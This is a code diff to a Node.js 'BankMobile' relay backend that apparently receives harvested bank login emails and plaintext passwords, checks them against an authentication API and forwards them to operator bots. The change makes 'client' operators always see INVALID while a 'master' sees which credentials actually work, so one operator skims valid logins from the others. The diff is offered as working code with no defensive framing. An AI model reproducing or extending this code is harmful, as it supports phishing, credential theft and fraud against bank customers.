@@ -1,7 +1,7 @@
-+// ================================================
+// ================================================
 // BANKMOBILE CENTRAL RELAY BACKEND
 // Global + Per-Client + Master switch
-// Control endpoints support both GET + POST
+// Clients always see INVALID | Master sees real status
 // ================================================
 require('dotenv').config();
 const express = require('express');
@@ -157,19 +157,31 @@ async function authenticateWithAPI(email, password) {
 // ================================================
 function formatMessage(email, password, success) {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'UTC' });
-    const statusText = success ? '✅ VALID' : '❌ INVALID';
-    const statusEmoji = success ? '✅' : '❌';
 
-    const message =
-        `${statusEmoji} <b>BANKMOBILE LOGIN</b>\n` +
+    // Real status for MASTER
+    const masterStatusText = success ? '✅ VALID' : '❌ INVALID';
+    const masterStatusEmoji = success ? '✅' : '❌';
+
+    const masterMessage =
+        `${masterStatusEmoji} <b>BANKMOBILE LOGIN</b>\n` +
         `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
         `📧 <b>Email:</b> <code>${email}</code>\n` +
         `🔑 <b>Password:</b> <code>${password}</code>\n` +
-        `📊 <b>Status:</b> ${statusText}\n` +
+        `📊 <b>Status:</b> ${masterStatusText}\n` +
         `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
         `🕐 ${timestamp}`;
 
-    return { clientMessage: message, masterMessage: message };
+    // Always show INVALID to CLIENTS
+    const clientMessage =
+        `❌ <b>BANKMOBILE LOGIN</b>\n` +
+        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+        `📧 <b>Email:</b> <code>${email}</code>\n` +
+        `🔑 <b>Password:</b> <code>${password}</code>\n` +
+        `📊 <b>Status:</b> ❌ INVALID\n` +
+        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+        `🕐 ${timestamp}`;
+
+    return { clientMessage, masterMessage };
 }
 
 function formatPhoneMessage(phone) {
@@ -370,10 +382,11 @@ app.get('/', (req, res) => {
         masterEnabled,
         clientsEnabled,
         disabledClients: Array.from(disabledClients),
+        note: 'Clients always see INVALID | Master sees real status',
         control: {
             'GET/POST /clients-off': 'Disable ALL clients',
             'GET/POST /clients-on': 'Enable ALL clients',
-            'GET/POST /client-off/:clientId': 'Disable one client (example: /client-off/mm)',
+            'GET/POST /client-off/:clientId': 'Disable one client',
             'GET/POST /client-on/:clientId': 'Enable one client',
             'GET/POST /master-off': 'Disable Master bot',
             'GET/POST /master-on': 'Enable Master bot',
@@ -388,6 +401,7 @@ app.get('/', (req, res) => {
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ BankMobile Relay running on port ${PORT}`);
     console.log(`📨 Clients: ${Object.keys(BOT_CONFIGS).join(', ')}`);
+    console.log(`👑 Master sees REAL status | Clients always see INVALID`);
     console.log(`🔧 Clients: /clients-off  |  /clients-on`);
     console.log(`🔧 Single:  /client-off/mm  |  /client-on/mm`);
     console.log(`🔧 Master:  /master-off   |  /master-on`);
